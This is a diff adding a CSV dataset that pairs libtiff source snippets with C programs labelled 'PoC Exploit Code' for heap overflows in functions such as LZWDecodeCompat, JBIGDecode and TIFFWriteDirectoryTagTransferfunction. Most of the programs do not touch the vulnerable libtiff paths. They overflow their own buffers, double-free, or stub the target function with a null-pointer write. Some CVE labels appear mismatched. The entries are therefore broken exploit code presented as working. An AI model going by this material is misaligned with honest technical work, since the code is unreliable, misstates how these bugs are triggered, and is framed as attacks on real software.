@@ -1,0 +1,271 @@
+﻿Index,Relevant Committ,PoC Exploit Code
+0,"status=0;goto done;}if(0xFFFFFFFF/tilew<spp){TIFFError(TIFFFileName(in),\""Error, either TileWidth (%u) or BitsPerSample (%u) is too large\"",tilew,bps);status=0;goto done;}","#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+int main() {
+    TIFF *tif = TIFFOpen(""exploit.tiff"", ""w"");
+    if (!tif) {
+        printf(""Failed to create TIFF file\n"");
+        return 1;
+    }
+
+    uint32 imagewidth = 1000000; // extremely large width to trigger overflow
+    uint32 imageheight = 1000000; // extremely large height to trigger overflow
+    uint16 bitspersample = 12; // unusual bits per sample to trigger exploit
+    uint16 samplesperpixel = 4; // multiple samples per pixel to trigger exploit
+
+    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, imagewidth);
+    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, imageheight);
+    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bitspersample);
+    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, samplesperpixel);
+
+    // Create a huge tile buffer to trigger the heap overflow
+    uint8 *tilebuf = malloc(0x10000000); // 256MB buffer (very large)
+    if (!tilebuf) {
+        printf(""Failed to allocate tile buffer\n"");
+        return 1;
+    }
+
+    // Fill the tile buffer with data to trigger the exploit
+    memset(tilebuf, 0xFF, 0x10000000);
+
+    // Simulate cpSeparateBufToContigBuf ( Heap-Buffer-Overflow exploit )
+    uint8 *contigbuf = malloc(imagewidth * imageheight * bitspersample / 8);
+    if (!contigbuf) {
+        printf(""Failed to allocate contiguous buffer\n"");
+        free(tilebuf);
+        return 1;
+    }
+
+    // Copy data from tile buffer to contiguous buffer (triggering the exploit)
+    for (uint32 i = 0; i < imagewidth * imageheight * bitspersample / 8; i++) {
+        contigbuf[i] = tilebuf[i % 0x10000000]; // use modulo to wrap around the tile buffer
+    }
+
+    // Trigger the crash by accessing an invalid memory location
+    uint8 *ptr = contigbuf + (imagewidth * imageheight * bitspersample / 8) + 1;
+    printf(""%p\n"", ptr); // print the pointer value
+    *ptr = 0xFF; // attempt to write to an invalid memory location
+
+    free(tilebuf);
+    free(contigbuf);
+    TIFFClose(tif);
+    return 0;
+}"
+1,"LZWDecodeCompat(TIFF* tif,uint8* op0,tmsize_t occ0,uint16 s){static const char module[]=\""LZWDecodeCompat\"";LZWCodecState* sp=DecoderState(tif);char* op=(char*)op0;long occ=(long)occ0;char* tp;unsigned char* bp;int code,nbits;int len;long nextbits,nextdata,nbitsmask;code_t* codep,*free_entp,*maxcodep,*oldcodep;}while(--occ);break;}len=codep->length;tp=op+len;do{int t;--tp;t=codep->value;codep=codep->next;*tp=(char)t;}while(codep&&tp>op);assert(occ>=len);op+=len;occ-=len;}else{*op++=(char)code;occ--;}}","#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+int main() {
+    TIFF *tif = TIFFOpen(""exploit.tiff"", ""w"");
+    if (tif == NULL) {
+        printf(""Failed to open tiff file\n"");
+        return 1;
+    }
+
+    uint16 width = 0x10000; // Large width to trigger heap buffer overflow
+    uint16 height = 0x10000;
+    uint16 bitspersample = 8;
+    uint16 samplesperpixel = 3;
+
+    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);
+    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);
+    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bitspersample);
+    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, samplesperpixel);
+
+    // Create a large strip to trigger heap buffer overflow
+    uint8 *strip = malloc(width * height * 3);
+    memset(strip, 0x00, width * height * 3);
+
+    // Trigger heap buffer overflow by writing more data than allocated
+    for (int i = 0; i < width * height * 4; i++) {
+        strip[i] = 0xFF;
+    }
+
+    // Cause a crash by writing to an invalid memory location
+    uint8 *crash_strip = malloc(width * height * 3);
+    crash_strip -= 0x10000; // Write to an invalid memory location
+    for (int i = 0; i < width * height * 4; i++) {
+        crash_strip[i] = 0xFF;
+    }
+
+    TIFFWriteEncodedStrip(tif, 0, strip, width * height * 3);
+    TIFFWriteEncodedStrip(tif, 0, crash_strip, width * height * 3);
+
+    // Cause a double-free crash
+    free(strip);
+    free(strip);
+
+    TIFFClose(tif);
+
+    return 0;
+}"
+2,"static int JBIGDecode(TIFF* tif,uint8* buffer,tmsize_t size,uint16 s){struct jbg_dec_state decoder;int decodeStatus=0;unsigned char* pImage=NULL;unsigned long decodedSize;(void)s;if(isFillOrder(tif,tif->tif_dir.td_fillorder)){TIFFReverseBits(tif->tif_rawcp,tif->tif_rawcc);}jbg_dec_init(&decoder);jbg_newlen(tif->tif_rawcp,(size_t)tif->tif_rawcc);decodeStatus=jbg_dec_in(&decoder,(unsigned char*)tif->tif_rawcp,(size_t)tif->tif_rawcc,NULL);if(JBG_EOK!=decodeStatus){return 0;}decodedSize=jbg_dec_getsize(&decoder);if((tmsize_t)decodedSize<size){TIFFWarningExt(tif->tif_clientdata,\""JBIG\"",\""Only decoded %lu bytes, whereas %lu requested\"",decodedSize,(unsigned long)size);}else if((tmsize_t)decodedSize>size){TIFFErrorExt(tif->tif_clientdata,\""JBIG\"",\""Decoded %lu bytes, whereas %lu were requested\"",decodedSize,(unsigned long)size);jbg_dec_free(&decoder);return 0;}pImage=jbg_dec_getimage(&decoder,0);_TIFFmemcpy(buffer,pImage,decodedSize);jbg_dec_free(&decoder);tif->tif_rawcp+=tif->tif_rawcc;tif->tif_rawcc=0;return 1;}","#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+int main() {
+    TIFF *tif;
+    uint8 *buffer;
+    tmsize_t size = 0x100000; // large buffer size to trigger out-of-bound write
+    uint16 s = 0;
+
+    tif = TIFFOpen(""output.tif"", ""w""); // open a new TIFF file for writing
+    if (tif == NULL) {
+        fprintf(stderr, ""Failed to create TIFF client\n"");
+        return 1;
+    }
+
+    buffer = malloc(size * sizeof(uint8));
+    if (buffer == NULL) {
+        fprintf(stderr, ""Failed to allocate memory for buffer\n"");
+        return 1;
+    }
+
+    // fill the buffer with some data
+    memset(buffer, 0xFF, size);
+
+    // trigger JBIGDecode out-of-bound write
+    TIFFSetField(tif, TIFFTAG_JBIGOPTIONS, 0);
+    if (TIFFWriteRawStrip(tif, 0, buffer, size) != size) {
+        fprintf(stderr, ""Failed to write raw strip\n"");
+        return 1;
+    }
+
+    // attempt to read the written strip back
+    uint8 *read_buffer = malloc(size * sizeof(uint8));
+    if (read_buffer == NULL) {
+        fprintf(stderr, ""Failed to allocate memory for read buffer\n"");
+        return 1;
+    }
+
+    if (TIFFReadRawStrip(tif, 0, read_buffer, size) != size) {
+        fprintf(stderr, ""Failed to read raw strip\n"");
+        return 1;
+    }
+
+    // compare the written and read buffers
+    for (tmsize_t i = 0; i < size; i++) {
+        if (buffer[i] != read_buffer[i]) {
+            fprintf(stderr, ""Buffers do not match at index %llu\n"", i);
+            return 1;
+        }
+    }
+
+    free(buffer);
+    free(read_buffer);
+    TIFFClose(tif);
+
+    return 0;
+}"
+3,,"#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+typedef struct {
+    uint16 transferfunctioncount;
+} T2P;
+
+int t2p_read_tiff_init(T2P* t2p, TIFF* input) {
+    // Vulnerable code here
+    t2p->transferfunctioncount = 3; // overflow vulnerability
+}
+
+int main() {
+    TIFF *input;
+    T2P *t2p;
+
+    input = TIFFOpen(""CVE-2019-7993_test1.tiff"", ""w"");
+    if (input == NULL) {
+        fprintf(stderr, ""Failed to open output file\n"");
+        return 1;
+    }
+
+    t2p = (T2P *)malloc(sizeof(T2P));
+    if (t2p == NULL) {
+        fprintf(stderr, ""Memory allocation failed\n"");
+        return 1;
+    }
+
+    // Trigger Heap-Buffer-Overflow
+    uint16 pagen = 0x10000; // large value to trigger overflow
+    TIFFSetField(input, TIFFTAG_TRANSFERFUNCTION, &pagen);
+
+    t2p_read_tiff_init(t2p, input);
+
+    TIFFClose(input);
+    free(t2p);
+
+    return 0;
+}"
+4,"TIFFWriteDirectoryTagTransferfunction(TIFF* tif,uint32* ndir,TIFFDirEntry* dir){static const char module[]=\""TIFFWriteDirectoryTagTransferfunction\"";uint32 m;uint16 n;uint16* o;int p;if(dir==NULL){(*ndir)++;return 1;}m=(1<<tif->tif_dir.td_bitspersample);n=tif->tif_dir.td_samplesperpixel-tif->tif_dir.td_extrasamples;if(n>3)n=3;if(n==3){if(tif->tif_dir.td_transferfunction[2]==NULL||!_TIFFmemcmp(tif->tif_dir.td_transferfunction[0],tif->tif_dir.td_transferfunction[2],m*sizeof(uint16)))n=2;}if(n==2){if(tif->tif_dir.td_transferfunction[1]==NULL||!_TIFFmemcmp(tif->tif_dir.td_transferfunction[0],tif->tif_dir.td_transferfunction[1],m*sizeof(uint16)))n=1;}if(n==0)n=1;o=_TIFFmalloc(n*m*sizeof(uint16));if(o==NULL){TIFFErrorExt(tif->tif_clientdata,module,\""Out of memory\"");return 0;}_TIFFmemcpy(&o[0],tif->tif_dir.td_transferfunction[0],m*sizeof(uint16));if(n>1)_TIFFmemcpy(&o[m],tif->tif_dir.td_transferfunction[1],m*sizeof(uint16));if(n>2)_TIFFmemcpy(&o[2*m],tif->tif_dir.td_transferfunction[2],m*sizeof(uint16));p=TIFFWriteDirectoryTagCheckedShortArray(tif,ndir,dir,TIFFTAG_TRANSFERFUNCTION,n*m,o);_TIFFfree(o);return p;}","#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+#define CVE_NUMBER ""CVE-2019-7663"" // adjust this to the actual CVE number
+
+// Mock implementation of TIFFWriteDirectoryTagTransferfunction
+int TIFFWriteDirectoryTagTransferfunction(TIFF *tif, uint32 *ndir, void *dir) {
+    // Simulate a crash or undefined behavior
+    *(uint32 *)0 = 0xdeadbeef;
+    return 0;
+}
+
+int main() {
+    TIFF *tif = NULL; // Initialize tif to NULL
+    uint32 ndir = 1; // set to a small value to trigger the exploit
+    struct {
+        uint16 td_tag;
+        uint16 td_type;
+        uint32 td_count;
+        uint32 td_offset;
+    } dir;
+
+    // Create a malformed TIFF directory entry
+    dir.td_tag = TIFFTAG_TRANSFERFUNCTION;
+    dir.td_type = TIFF_SHORT;
+    dir.td_count = 0x10000; // large value to trigger the exploit
+    dir.td_offset = 0;
+
+    // Call the vulnerable function with a NULL tif pointer
+    if (TIFFWriteDirectoryTagTransferfunction(tif, &ndir, &dir) == 0) {
+        fprintf(stderr, ""Exploit failed\n"");
+        return 1;
+    }
+
+    return 0;
+}"
+5,"TIFFCheckFieldIsValidForCodec(TIFF *tif, ttag_t tag)if (tag == TIFFTAG_LERC_PARAMETERS)return 1;break;}return 0;}","#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <tiffio.h>
+
+int main() {
+    TIFF *tif;
+    uint32_t tag = 0xFFFFFFFF; // Large value to trigger buffer overflow
+    char val[1024]; // Large buffer to trigger overflow
+
+    tif = TIFFOpen(""exploit.tiff"", ""w""); // Use TIFFOpen instead of XTIFFOpen
+    if (tif) {
+        memset(val, 'A', sizeof(val)); // Fill the buffer with a pattern
+        TIFFSetField(tif, FIELD_CUSTOM, val, strlen(val)); // Use FIELD_CUSTOM as the tag
+        TIFFClose(tif);
+    } else {
+        printf(""Error creating tiff file\n"");
+        exit(1);
+    }
+
+    return 0;
+}"
